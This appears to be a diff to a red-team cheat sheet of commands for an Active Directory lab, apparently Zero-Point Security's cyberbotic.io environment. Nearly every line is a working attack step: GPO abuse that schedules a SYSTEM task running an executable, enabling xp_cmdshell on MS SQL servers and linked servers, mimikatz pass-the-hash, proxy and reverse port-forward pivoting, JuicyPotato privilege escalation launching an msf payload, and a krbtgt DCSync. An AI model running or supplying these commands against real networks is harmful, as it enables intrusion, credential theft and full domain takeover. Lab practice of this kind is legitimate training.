@@ -346,15 +346,52 @@ Assembly SharpHound3 "-c All -D dev.zeropointsecurity.co.uk"
 Assembly SharpView "Get-DomainUser -SPN -Domain dev.zeropointsecurity.co.uk -Properties SamAccountName"
 
 #GPO
+Bloodhound 
 PowerShell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
 PowerShell Find-DomainShare -CheckShareAccess
 PowerShell New-GPO -Name 'comemeloshuevos2' | New-GPLink -Target 'OU=3268,OU=Workstations,DC=cyberbotic,DC=io'  
 Assembly  /assemblyname:"SharpGPOAbuse" /parameters:"--AddComputerTask --TaskName \"Rasta Task\" --Author NT AUTHORITY\SYSTEM --Command \"cmd.exe\" --Arguments \"/c \\fs-1\software\nuevo5.exe\" --GPOName \"comemeloshuevos2\""
- 
 
+#MS SQL Servers
+MakeToken svc_mssql cyberbotic.io REDACTED
+PowerShell Get-SQLInstanceDomain | Get-SQLConnectionTest
+PowerShell Get-SQLServerInfo -Instance 'sql-1.cyberbotic.io,1433'
+PowerShell Get-SQLQuery -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@servername'
+PowerShell Invoke-SQLOSCmd -Instance 'sql-1.cyberbotic.io,1433' -Command 'dir C:\' -RawResults
 
+proxychains socat TCP4-Listen:1433,fork TCP:10.10.120.20:1433
 
+mimikatz sekurlsa::pth /user:s.ball /domain:cyberbotic.io /ntlm:ewewefewff /run  "c:\program.exe"
+runas /netonly /user:CYBER\svc_mssql "C:\Program Files\HeidiSQL\heidisql.exe"
 
+sp_configure 'Show Advanced Options', 1; RECONFIGURE;
+sp_configure 'xp_cmdshell', 1; RECONFIGURE
+EXEC xp_cmdshell 'whoami'
+
+portfwd add -R -p 8080 -l ip -L 443
+portfwd add -R -p 8888 -l 80 -L ip
+
+#MS SQL Lateral Movement
+
+PowerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433'
+PowerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery
+PowerShell Get-SQLServerLinkCrawl -Instance 'sql-1.cyberbotic.io,1433' -Query 'select @@version' | select Instance, CustomQuery | % { $_ | Add-Member NoteProperty 'QueryResult' $($_.CustomQuery[0]); $_ } | fl
+EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [sql02.dev.zeropointsecurity.co.uk]
+EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [sql02.dev.zeropointsecurity.co.uk]
+SELECT * FROM OPENQUERY("sql02.dev.zeropointsecurity.co.uk", 'select * from sys.configurations where name = ''xp_cmdshell''')
+
+portfwd flush
+netstat -anp tcp
+portfwd add -R -p 8888 -l 80
+
+#MS SQL Privilege Escalation
+powershell_import /tmp/PowerUp.ps1
+powershell_execute Invoke-PrivescAudit
+execute -H -c -i -f JuicyPotato.exe -a "-t * -p C:\Temp\msf.exe -l 1337"
+
+#Domain Dominance
+krbtgt NTLM
+mimikatz(powershell) # lsadump::dcsync /user:krbtgt /domain:cyberbotic.io
 
 
 
